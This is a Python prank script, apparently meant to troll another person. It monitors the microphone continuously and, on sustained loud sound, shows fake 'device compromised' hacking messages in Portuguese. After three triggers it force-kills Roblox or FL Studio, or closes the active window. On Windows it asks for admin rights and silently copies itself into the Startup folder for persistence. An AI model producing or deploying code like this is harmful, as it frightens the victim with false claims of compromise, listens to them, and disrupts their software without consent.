import sounddevice as sd
import numpy as np
import time
import random
import sys
import os
import ctypes
import platform

# --- CONFIGURATION ---
THRESHOLD = 0.08  
DURATION_REQUIRED = 1.2
COOLDOWN = 60         
STRIKE_LIMIT = 3
SAMPLE_RATE = 16000  
CHANNELS = 1
BLOCK_SIZE = 1024     

MESSAGES = [
    "[+] Hackeando Internet", "[+] Vazando Arquivos", "[+] Vazando O Grupo",
    "[+] Localizando IP...", "[+] Acessando Câmera...", "[+] Desencriptando Senhas...",
    "[+] Bypassando Firewall...", "[+] Uploading trojan...", "[+] Capturando contatos...",
    "[+] Dumpando banco de dados...", "[+] Iniciando ataque DDoS...", "[+] Infectando kernel...",
    "[+] Extraindo chaves SSH...", "[+] Criando backdoor persistente...", "[+] Completo!"
]

def is_admin():
    try:
        if platform.system() == "Windows":
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        return os.getuid() == 0
    except AttributeError:
        return False

def run_as_admin():
    if platform.system() == "Windows":
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

def close_active_window():
    if platform.system() == "Windows":
        try:
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0) # WM_CLOSE
        except:
            pass
    elif platform.system() == "Android":
        os.system("input keyevent 3")

def kill_process(process_name):
    if platform.system() == "Windows":
        # Check if process is running first
        check = os.popen(f'tasklist /FI "IMAGENAME eq {process_name}"').read()
        if process_name in check:
            os.system(f"taskkill /F /IM {process_name} >nul 2>&1")
            return True
    return False

def apply_penalty():
    global strikes
    strikes += 1
    print(f"\n[!!!] STRIKE {strikes}/{STRIKE_LIMIT} DETECTADO [!!!]\n")
    
    if strikes >= STRIKE_LIMIT:
        print("[!] LIMITE DE STRIKES ATINGIDO. EXECUTANDO CONTRA-MEDIDAS...\n")
        # 1. Try Roblox
        if not kill_process("RobloxPlayerBeta.exe"):
            # 2. Try FL Studio (both 64 and 32 bit versions)
            if not kill_process("FL64.exe") and not kill_process("FL.exe"):
                # 3. Close current window
                close_active_window()
        strikes = 0 # Reset after penalty

def print_troll():
    global last_trigger
    last_trigger = time.time()
    
    if platform.system() == "Android":
        os.system("am start --user 0 -n com.termux/.TermuxActivity > /dev/null 2>&1")
    
    print("\n" + "!"*40)
    print(" ATENÇÃO: ATIVIDADE SUSPEITA DETECTADA ".center(40, "!"))
    print("!"*40 + "\n")
    
    # Fase de scan falsa
    for i in range(3):
        sys.stdout.write(f"\r[*] Escaneando vulnerabilidades{'.' * (i+1)}")
        sys.stdout.flush()
        time.sleep(0.7)
    print("\n[!] Alvo bloqueado. Iniciando extração...\n")
    time.sleep(1)

    random_msgs = random.sample(MESSAGES[3:-1], k=min(5, len(MESSAGES)-4))
    sequence = [MESSAGES[0], MESSAGES[1], MESSAGES[2]] + random_msgs + [MESSAGES[-1]]
    
    for msg in sequence:
        for char in msg:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.03)
        print()
        time.sleep(random.uniform(0.4, 1.2))
    
    print("\n" + "="*40)
    print(" DISPOSITIVO COMPROMETIDO ".center(40, "="))
    print("="*40 + "\n")
    
    apply_penalty()

def callback(indata, frames, time_info, status):
    global sustained_start, last_trigger
    if status or (time.time() - last_trigger < COOLDOWN):
        return
    
    rms = np.sqrt(np.mean(indata**2))
    
    if rms > THRESHOLD:
        if sustained_start is None:
            sustained_start = time.time()
        elif time.time() - sustained_start >= DURATION_REQUIRED:
            print_troll()
            sustained_start = None
    else:
        sustained_start = None

sustained_start = None
last_trigger = 0
strikes = 0

import shutil

def add_to_startup():
    if platform.system() == "Windows":
        try:
            # Get the path to the current executable
            if getattr(sys, 'frozen', False):
                current_exe = sys.executable
                file_name = os.path.basename(current_exe)
                
                # Windows Startup Folder path
                startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
                destination = os.path.join(startup_folder, file_name)
                
                # Copy if not already there
                if not os.path.exists(destination):
                    shutil.copy2(current_exe, destination)
        except Exception:
            pass

if __name__ == "__main__":
    if platform.system() == "Windows":
        if not is_admin():
            print("[!] Solicitando permissões de administrador...")
            run_as_admin()
        else:
            # If we are admin, try to add to startup automatically
            add_to_startup()

    try:
        with sd.InputStream(callback=callback, 
                          channels=CHANNELS, 
                          samplerate=SAMPLE_RATE, 
                          blocksize=BLOCK_SIZE,
                          dtype='float32'):
            while True:
                time.sleep(1) 
    except KeyboardInterrupt:
        pass
    except Exception as e:
        if not getattr(sys, 'frozen', False):
            print(f"Erro: {e}")
